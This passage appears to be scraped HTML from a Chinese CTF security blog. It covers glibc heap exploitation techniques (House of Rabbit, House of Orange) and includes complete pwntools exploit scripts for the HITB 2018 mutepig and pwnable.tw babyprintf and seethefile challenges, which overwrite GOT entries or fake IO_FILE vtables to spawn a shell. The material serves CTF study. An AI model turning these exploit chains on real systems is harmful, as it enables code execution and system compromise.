p-&gt;fd_nextsize = NULL;</span><br><span class="line">    p-&gt;bk_nextsize = NULL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  p-&gt;bk = unsorted_bin;</span><br><span class="line">  p-&gt;fd = first_unsorted;</span><br><span class="line">  set_foot(p, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else &#123;</span><br><span class="line">  size += nextsize;</span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  av-&gt;top = p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对应步骤代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 4. call malloc_consolidate</span><br><span class="line">printf(	&quot;4. call malloc_consolidate\n&quot;</span><br><span class="line">	&quot;  Free the small chunk (%p) next to top, and link fake_chunk1(%p) to unsorted bins.\n\n&quot;</span><br><span class="line">	, small, fake);</span><br><span class="line">free(small);</span><br></pre></td></tr></table></figure>
<p>步骤结束后，内存分布如下：</p>
<p><a href="http://p4nda.top/img/house_of_rabbit/4.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/house_of_rabbit/4.png" alt="img"></a></p>
<h2 id="步骤5-分配内存-使伪造堆块进入large-bin"><a href="#步骤5-分配内存-使伪造堆块进入large-bin" class="headerlink" title="步骤5 分配内存 使伪造堆块进入large bin"></a>步骤5 分配内存 使伪造堆块进入large bin</h2><p>当伪造的堆块进入unsorted bin时，并不能达到目的，需要进一步使堆块进入large bin，此时需要将伪造的堆块大小改为0xa00001，其目的有两个，1是绕过程序对unsorted bin中内存块大小小于av-&gt;system_mem的检测；2是使程序放入large bin的最后一块（&gt;0x800000)</p>
<p>malloc检测如下（malloc.c 3473）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">for (;; )</span><br><span class="line">   &#123;</span><br><span class="line">     int iters = 0;</span><br><span class="line">     while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">       &#123;</span><br><span class="line">         bck = victim-&gt;bk;</span><br><span class="line">         if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0)</span><br><span class="line">             || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0))</span><br><span class="line">           malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;,</span><br><span class="line">                            chunk2mem (victim), av);</span><br><span class="line">         size = chunksize (victim);</span><br></pre></td></tr></table></figure>
<p>步骤代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 5. Link unsorted bins to appropriate list</span><br><span class="line">	printf(	&quot;5. Link unsorted bins to appropriate list\n&quot;</span><br><span class="line">		&quot;  Rewrite fake_chunk1&apos;s size to 0xa00001 to bypass &apos;size &lt; av-&gt;system_mem&apos; check.\n&quot;);</span><br><span class="line">	gbuf[3] = 0xa00001;</span><br><span class="line">	malloc(0xa00000);</span><br><span class="line">	printf(	&quot;  Allocate huge chunk.\n&quot;</span><br><span class="line">		&quot;  Now, fake_chunk1 link to largebin[126](max).\n&quot;</span><br><span class="line">		&quot;  Then, write fake_chunk1&apos;s size back to 0xfffffffffffffff1.\n\n&quot;);</span><br><span class="line">	gbuf[3] = 0xfffffffffffffff1;</span><br></pre></td></tr></table></figure>
<p>最终，程序的堆块布局如下：</p>
<p><a href="http://p4nda.top/img/house_of_rabbit/5.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/house_of_rabbit/5.png" alt="img"></a></p>
<h2 id="步骤6-任意内存分配"><a href="#步骤6-任意内存分配" class="headerlink" title="步骤6 任意内存分配"></a>步骤6 任意内存分配</h2><p>当伪造堆块进入large bin最后一个队列时，将伪造堆块的大小改回0xfffffffffffffff1，此时在申请任意长度的地址，使堆块地址上溢到当前堆地址的低地址位置，从而可以分配到任意地址，达到内存任意写的目的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 6. Overwrite targer variable</span><br><span class="line">printf(	&quot;6. Overwrite targer variable on .data\n&quot;</span><br><span class="line">	&quot;  target is at %p\n&quot;</span><br><span class="line">	&quot;  Before : %s\n&quot;</span><br><span class="line">	, &amp;target, target);</span><br><span class="line"></span><br><span class="line">malloc((void*)&amp;target-(void*)(gbuf+2)-0x20);</span><br><span class="line">victim = malloc(0x10);</span><br><span class="line">printf(&quot;  Allocate 0x10 byte at %p, and overwrite.\n&quot;, victim);</span><br><span class="line">strcpy(victim, &quot;Hacked!!&quot;);</span><br><span class="line"></span><br><span class="line">printf(&quot;  After  : %s\n&quot;, target);</span><br></pre></td></tr></table></figure>
<h1 id="相关题目"><a href="#相关题目" class="headerlink" title="相关题目"></a>相关题目</h1><h2 id="HITB-CTF-2018-mutepig"><a href="#HITB-CTF-2018-mutepig" class="headerlink" title="HITB CTF 2018 mutepig"></a>HITB CTF 2018 mutepig</h2><p>题目提供分配大小为0x10、0x80、0xa00000、0xffffffffffffff70大小的堆块，并且没有开启PIE保护，还存在UAF漏洞，完全满足该利用方法需求，通过将内存地址分配回bss段低地址部分的堆地址指针数组，覆写数组内容为free@got，利用编辑功能，将其内容改为system@plt，在free时可以拿到shell。</p>
<p>坑点在于此题没有输出，调试比较坑。另外需要注意<strong>利用方法</strong>中提到的当大堆块释放到unsorted bin时，小堆块的值会有改动。</p>
<p><strong>EXP</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">debug = 0</span><br><span class="line">elf=ELF(&apos;mutepig&apos;)</span><br><span class="line"></span><br><span class="line">if debug:</span><br><span class="line">	p = process(&apos;./mutepig&apos;)</span><br><span class="line">	libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">	context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">	p = remote(&apos;47.75.128.158&apos;, 9999)</span><br><span class="line">	#libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line">	context.log_level = &apos;debug&apos;</span><br><span class="line">	#libc = ELF(&apos;./libc-2.23.so&apos;)</span><br><span class="line">	#off = 0x001b0000</span><br><span class="line">def add(type,content):</span><br><span class="line">	p.sendline(&apos;1&apos;)</span><br><span class="line">	p.sendline(str(type))</span><br><span class="line">	p.send(content)</span><br><span class="line">	time.sleep(1)</span><br><span class="line">def free(index):</span><br><span class="line">	p.sendline(&apos;2&apos;)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,content1,content2):</span><br><span class="line">	p.sendline(&apos;3&apos;)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	p.send(content1)</span><br><span class="line">	p.send(content2)</span><br><span class="line">	time.sleep(1)</span><br><span class="line"></span><br><span class="line">bss_list = 0x06020C0</span><br><span class="line">bss_can_be_edit = 0x602120</span><br><span class="line">add(3,&apos;p4nda_0&apos;) #0</span><br><span class="line">free(0)</span><br><span class="line">add(3,&apos;p4nda_1&apos;) #1</span><br><span class="line">free(1)</span><br><span class="line">add(1,&apos;p4nda_2&apos;) #2</span><br><span class="line">add(2,&apos;p4nda_3&apos;) #3</span><br><span class="line">free(2)</span><br><span class="line">edit(2,p64(bss_can_be_edit+0x10)[:-1],p64(0)+p64(0x11)+p64(0)+p64(0xfffffffffffffff1)+&apos;\0&apos;*15)</span><br><span class="line">free(3)</span><br><span class="line">edit(2,p64(0)[:-1],p64(0)+p64(0x11)+p64(0)+p64(0xA00001))</span><br><span class="line">add(3,&apos;p4nda_4&apos;) #4</span><br><span class="line">edit(2,p64(bss_can_be_edit+0x10)[:-1],p64(0xfffffffffffffff0)+p64(0x10)+p64(0)+p64(0xfffffffffffffff1))</span><br><span class="line">#</span><br><span class="line">add(0x3419,&apos;p4nda_5&apos;) #5</span><br><span class="line">add(1,p64(elf.got[&apos;free&apos;])[:-1])</span><br><span class="line"></span><br><span class="line">edit(0,p64(elf.symbols[&apos;system&apos;])[:-1],&apos;/bin/sh\0&apos;)</span><br><span class="line">edit(6,&apos;/bin/sh&apos;,&apos;/bin/sh\0&apos;)</span><br><span class="line"></span><br><span class="line">free(6)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><a href="http://p4nda.top/img/house_of_rabbit/mutepig" target="_blank" rel="noopener">题目</a></p>
<p>本文标题:<a href="http://p4nda.top/2018/04/18/house-of-rabbit/" target="_blank" rel="noopener">House Of Rabbit 原理</a></p>
<p>文章作者:<a href="http://p4nda.top/" target="_blank" rel="noopener">P4nda</a></p>
<p>发布时间:2018-04-18, 20:49:22</p>
<p>最后更新:2018-07-05, 21:32:46</p>
<p>原始链接:<a href="http://p4nda.top/2018/04/18/house-of-rabbit/" target="_blank" rel="noopener">http://p4nda.top/2018/04/18/house-of-rabbit/</a> </p>
<p>许可协议: <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">“署名-非商用-相同方式共享 4.0”</a> 转载请保留原文链接及作者。</p>

      
    </div>
    
    <footer>
        <div class="alignright">
          

        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
     
      
      
  
    <h1 class="title"><a href="/2018/10/21/hfo/">house-of-orange</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h1><h2 id="unsorted-bin-attack方法和house-of-orange"><a href="#unsorted-bin-attack方法和house-of-orange" class="headerlink" title="unsorted bin attack方法和house of orange"></a>unsorted bin attack方法和house of orange</h2><p>可覆盖的 _IO_LIST_ALL</p>
<p>​         io的虚表</p>
<p>​          max_fast</p>
<p>​          malloc_hook</p>
<p>​       </p>
<p>泄露libc基址</p>
<p>首先说明如何泄露libc的基址，当申请的内存大于某个阈值时，系统会调用mmap直接为应用程序分配页面，此时分配出来的的页面会紧贴着libc页面，所以我们可以通过分配一个大内存，最后得到地址加上大小最终就得到了libc的基址。题目又给了so，所以可以得到system以及_IO_list_all以及main_arena等结构的真实地址。</p>
<p>malloc大内存(0x2000000)前：</p>
<p><a href="http://p3.qhimg.com/t0163c5757a6a8cfa87.png" target="_blank" rel="noopener"><img src="http://p3.qhimg.com/t0163c5757a6a8cfa87.png" alt="http://p9.qhimg.com/t0167010858c2abf792.png"></a></p>
<p>malloc大内存后：</p>
<p><a href="http://p6.qhimg.com/t01270b436182e71a19.png" target="_blank" rel="noopener"><img src="http://p6.qhimg.com/t01270b436182e71a19.png" alt="http://p9.qhimg.com/t01e6a0ab056566b8fd.png"></a></p>
<p>可以看到0x00007f4b19898000+0x0x2001000就到了libc的基址，多0x1000是因为对齐。</p>
<p>获取unsorted bin chunk</p>
<p>当申请的堆块大于当前的top chunk size且小于用mmap分配的阈值时，系统会将原来的top chunk 放到unsorted bin中，同时分配新的较大的top chunk出来。</p>
<p>如果大于mmap分配的阈值，则直接从系统分配，源码如下：</p>
<p>所以为得到unsorted chunk ，申请分配的内存需要大于top chunk的size且小于mmap的阈值。    </p>
<p>还需要通过的一个检查：</p>
<p><a href="http://p8.qhimg.com/t012507b817ca7f4588.png" target="_blank" rel="noopener"><img src="http://p8.qhimg.com/t012507b817ca7f4588.png" alt="http://p6.qhimg.com/t017dd19b992310956a.png"></a></p>
<p>这个检查总结起来为：</p>
<p>\1. size需要大于0x20（MINSIZE）</p>
<p>\2. prev_inuse位要为1</p>
<p>\3. top chunk address + top chunk size 必须是页对齐的（页大小一般为0x1000）</p>
<p>所以在这一步中我们需要做的就是覆盖原来的top chunk size，然后再申请一个比较大的堆块，这样就可获得一个unsorted chunk。</p>
<p>覆盖IO_list_all并伪造 IO_FILE结构体</p>
<p>gdb查看file结构方法</p>
<p>p <em>((struct  _IO_FILE_plus</em>) 0x23ac1b0)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arena的结构 struct malloc_state &#123;</span><br></pre></td></tr></table></figure>
<p>有了多的unsorted chunk后，覆盖某个堆块的bk字段，使它指向IO_list_all-0x10字段，这样IO_list_all会被修改成指向main_arena的unsorted bin数组，原理图如下：</p>
<p><a href="http://p0.qhimg.com/t013d2f186fc1a0504f.png" target="_blank" rel="noopener"><img src="http://p0.qhimg.com/t013d2f186fc1a0504f.png" alt="http://p3.qhimg.com/t016a287b2c27661c90.png"></a></p>
<p> 同时当 glibc 检测到 memory corruption 时，它会flush 所有的 IO 流，调用_IO_flush_all_lockp 函数：</p>
<p><a href="http://p2.qhimg.com/t012119243fbdf73038.png" target="_blank" rel="noopener"><img src="http://p2.qhimg.com/t012119243fbdf73038.png" alt="http://p5.qhimg.com/t0116d84aa346bb1f90.png"></a></p>
<p>所以我们在覆盖了IO_list_all后，使其指向了main_arena的unsorted bin数组，这时的数组位置并不是我们可控的位置，从源代码中我们知道__IO_list_all最开始为main_arena的unsorted bin数组（代码A），不可控，如果我们构造适当的chunk使其在free后存放到了main_arena的unsorted bin数组偏移的0x68（smallbin里面）处，这样就可以实现fp指向我们可控的数据（代码B），然后绕过限制条件（代码C），执行_IO_OVERFLOW</p>
<p>备忘：（原作是system但是有检查，所以这里记下了了babyprintf的做法网上的babyprintf有些地方无法正常运行，所以这个脚本有改动）<br>备忘：（原作是system但是有检查，所以这里记下了了babyprintf的做法网上的babyprintf有些地方无法正常运行，所以这个脚本有改动）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do</span><span class="params">(llen,data)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">	p.sendline(str(llen))</span><br><span class="line">	p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">	p.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">	offset_start_main=<span class="number">0x00202E1</span></span><br><span class="line">	p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">	llen=<span class="number">0x90</span><span class="number">-8</span></span><br><span class="line">	p.sendline(str(llen))</span><br><span class="line">	p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">	leak_libc=<span class="string">'%1$p %2$p %3$p %4$p %5$p aaa %6$p '</span></span><br><span class="line">	sstr=<span class="string">'%p'</span>*<span class="number">90</span></span><br><span class="line">	p.sendline(leak_libc)</span><br><span class="line">	p.recvuntil(<span class="string">'aaa '</span>)</span><br><span class="line">	data=p.recvuntil(<span class="string">' '</span>)[:<span class="number">-1</span>]</span><br><span class="line">	real_start_main=int(data,<span class="number">16</span>)</span><br><span class="line">	libc_base=real_start_main-offset_start_main</span><br><span class="line">	real_io_list=libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">	real_system=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">	real_binsh=libc_base+sh</span><br><span class="line">	<span class="keyword">print</span> hex(real_system)</span><br><span class="line">	do(<span class="number">0x90</span><span class="number">-8</span>,<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xee1</span>))</span><br><span class="line">	do(<span class="number">0x1000</span><span class="number">-8</span>,<span class="string">"aaa"</span>)</span><br><span class="line">	fake_chunk=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)</span><br><span class="line">	fake_chunk+=p64(<span class="number">0xddaa</span>)+p64(real_io_list<span class="number">-0x10</span>)</span><br><span class="line">	fake_chunk+=p64(<span class="number">0x2</span>)+p64(<span class="number">0xffffffffffffff</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64( ((real_binsh<span class="number">-0x64</span>)/<span class="number">2</span>)+<span class="number">3</span> )</span><br><span class="line">	fake_chunk=fake_chunk.ljust(<span class="number">0xa0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">	fake_chunk+=p64(real_system+<span class="number">0x420</span>)</span><br><span class="line">	fake_chunk=fake_chunk.ljust(<span class="number">0xc0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">	fake_chunk+=p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	vtable_addr=libc_base+<span class="number">0x394500</span> <span class="comment">#0x394500  0x393A80</span></span><br><span class="line">	payload =fake_chunk</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(vtable_addr)</span><br><span class="line">	payload += p64(real_system)</span><br><span class="line">	payload += p64(<span class="number">2</span>)</span><br><span class="line">	payload += p64(<span class="number">3</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment"># vtable</span></span><br><span class="line">	payload += p64(real_system)</span><br><span class="line">	do(<span class="number">0x90</span><span class="number">-8</span>,<span class="string">'c'</span>*<span class="number">0x80</span>+payload )</span><br><span class="line">	p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">	llen=<span class="number">0x200</span><span class="number">-8</span></span><br><span class="line">	p.sendline(str(llen))</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p=process(<span class="string">"./babyprintf"</span>)</span><br><span class="line">	libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.24.so"</span>)</span><br><span class="line">	sh=<span class="number">0x1619B9</span></span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p=remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10104</span>)</span><br><span class="line">	libc=ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">	sh=<span class="number">0x00158E8B</span></span><br><span class="line">pwn()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">32</span>位</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = remote("chall.pwnable.tw", 10200)</span></span><br><span class="line"><span class="comment">#libc = ELF('./libc_32.so.6')</span></span><br><span class="line">p=process(<span class="string">"./seethefile"</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/i386-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open</span><span class="params">(filename)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"see"</span>, filename)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">'4'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">'5'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"name :"</span>, name)</span><br><span class="line">open(<span class="string">"/proc/self/maps"</span>)</span><br><span class="line"><span class="comment">#lead libc:</span></span><br><span class="line">read()</span><br><span class="line">p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">'3'</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'[heap]\n'</span>)</span><br><span class="line">recv=p.recv(<span class="number">10</span>)</span><br><span class="line">libc.address = int(recv[<span class="number">0</span>:<span class="number">8</span>], base = <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line"><span class="keyword">print</span> hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += (<span class="string">'\x00'</span> * <span class="number">0x20</span>)</span><br><span class="line">payload += p32(<span class="number">0x0804B284</span>)</span><br><span class="line">payload += <span class="string">"/bin/sh\x00"</span></span><br><span class="line">payload += p32(<span class="number">0</span>) * <span class="number">11</span></span><br><span class="line">payload += p32(<span class="number">0</span>)  </span><br><span class="line">payload += p32(<span class="number">0x0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p32(<span class="number">0x0804B260</span>)  </span><br><span class="line">payload += p32(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p32(<span class="number">0x0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>) * <span class="number">14</span></span><br><span class="line">payload += p32(<span class="number">0x804B31C</span>)</span><br><span class="line">payload += p32(<span class="number">0x0</span>)</span><br><span class="line">payload += p32(<span class="number">0x0</span>)</span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75edd10</span> - <span class="number">0xb7585000</span>)) <span class="comment"># finish</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ee6f0</span> - <span class="number">0xb7585000</span>)) <span class="comment"># overflow</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ee490</span> - <span class="number">0xb7585000</span>)) <span class="comment"># underflow</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ef560</span> - <span class="number">0xb7585000</span>)) <span class="comment"># uflow</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75f03f0</span> - <span class="number">0xb7585000</span>)) <span class="comment"># pbackfail</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ed980</span> - <span class="number">0xb7585000</span>)) <span class="comment"># xsputn</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ed5a0</span> - <span class="number">0xb7585000</span>)) <span class="comment"># xgetn</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ec840</span> - <span class="number">0xb7585000</span>)) <span class="comment"># seekoff</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ef800</span> - <span class="number">0xb7585000</span>)) <span class="comment"># seekpos</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ec680</span> - <span class="number">0xb7585000</span>)) <span class="comment"># setbuf</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ec570</span> - <span class="number">0xb7585000</span>)) <span class="comment"># sync</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75e1d80</span> - <span class="number">0xb7585000</span>)) <span class="comment"># deallocate</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ed930</span> - <span class="number">0xb7585000</span>)) <span class="comment"># read</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ed3f0</span> - <span class="number">0xb7585000</span>)) <span class="comment"># write</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ed130</span> - <span class="number">0xb7585000</span>)) <span class="comment"># seek</span></span><br><span class="line">payload += p32(libc.symbols[<span class="string">'system'</span>]) <span class="comment"># close</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ed3d0</span> - <span class="number">0xb7585000</span>)) <span class="comment"># stat</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75f0580</span> - <span class="number">0xb7585000</span>)) <span class="comment"># showmanyc</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75f0590</span> - <span class="number">0xb7585000</span>))<span class="comment"># imbue</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">'5'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#p.sendline('abcd')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <footer>
        <div class="alignright">
          

        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
     
      
      
  
    <h1 class="title"><a href="/2018/10/21/hexo/">搭建博客</a></h1>
  

    </header>
    <div class="entry">
      
        <p>使用环境 node.js（hexo）  github</p>
<h2 id="安装所有软件"><a href="#安装所有软件" class="headerlink" title="安装所有软件"></a>安装所有软件</h2><pre><code>官网下载node.js。
</code></pre><h2 id="初始化文件"><a href="#初始化文件" class="headerlink" title="初始化文件"></a>初始化文件</h2><pre><code>下载安装后，进入一个空目录输入如下代码：
